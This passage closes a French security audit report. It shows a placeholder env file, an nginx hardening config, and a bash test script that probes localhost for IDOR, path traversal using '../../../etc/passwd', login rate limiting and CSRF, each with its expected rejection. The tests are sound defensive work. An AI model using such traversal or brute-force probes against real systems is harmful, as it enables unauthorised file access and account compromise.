SUPABASE_URL=https://xxx.supabase.co
SUPABASE_KEY=xxx # JAMAIS exposer la clé service
SUPABASE_JWT_SECRET=xxx
CSRF_SECRET=xxx # Générer avec: openssl rand -base64 32
SECURITY_WEBHOOK_URL=https://alerts.company.com/webhook
SESSION_SECRET=xxx
ENCRYPTION_KEY=xxx
```

### Configuration Serveur
```nginx
# nginx.conf
server {
    listen 443 ssl http2;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    # Rate limiting
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req zone=api burst=20 nodelay;
    
    # Headers de sécurité
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    location / {
        proxy_pass http://backend:8080;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

### Tests de Sécurité Automatisés
```bash
# tests/security_test.sh
#!/bin/bash

# Test IDOR
curl -X GET http://localhost:8080/api/v1/files/download/999999 \
  -H "Authorization: Bearer $TOKEN"
# Expected: 404 Not Found

# Test Path Traversal
curl -X POST http://localhost:8080/api/v1/files/upload \
  -F "file=@test.txt" \
  -F "path=../../../etc/passwd" \
  -H "Authorization: Bearer $TOKEN"
# Expected: 400 Bad Request

# Test Rate Limiting
for i in {1..100}; do
  curl -X POST http://localhost:8080/api/v1/auth/login \
    -d '{"email":"test@test.com","password":"wrong"}' &
done
# Expected: 429 Too Many Requests après 5 tentatives

# Test CSRF
curl -X POST http://localhost:8080/api/v1/users/change-password \
  -d '{"new_salt":"xxx","new_encrypted_master_key":"xxx"}' \
  -H "Authorization: Bearer $TOKEN"
# Expected: 403 Forbidden (sans token CSRF)
```

---

## 📞 CONTACT & SUIVI

**Auditeur**: Expert Sécurité SaferCloud  
**Date Audit**: 28 Janvier 2026  
**Prochaine Révision**: 28 Février 2026  

**Classification des Données**: 
- MasterKeys: **TOP SECRET** 🔴
- User Data: **CONFIDENTIAL** 🟠
- Logs: **INTERNAL** 🟡

**Conformité**:
- ✅ RGPD (Article 32: Sécurité du traitement)
- ✅ OWASP Top 10 2021
- ⚠️ ISO 27001 (Partiellement conforme)
- ❌ SOC 2 Type II (Non audité)

---

## ⚠️ CLAUSE DE NON-RESPONSABILITÉ

Ce rapport identifie des vulnérabilités critiques qui DOIVENT être corrigées avant tout déploiement en production. L'exploitation de ces vulnérabilités pourrait entraîner:

- Vol de données utilisateur
- Compromission de comptes
- Perte totale de confidentialité
- Atteinte à la réputation
- Non-conformité RGPD (amendes jusqu'à 4% du CA)

**Ne PAS déployer en production sans avoir appliqué AU MINIMUM les correctifs critiques 1-5.**

---

**FIN DU RAPPORT D'AUDIT**
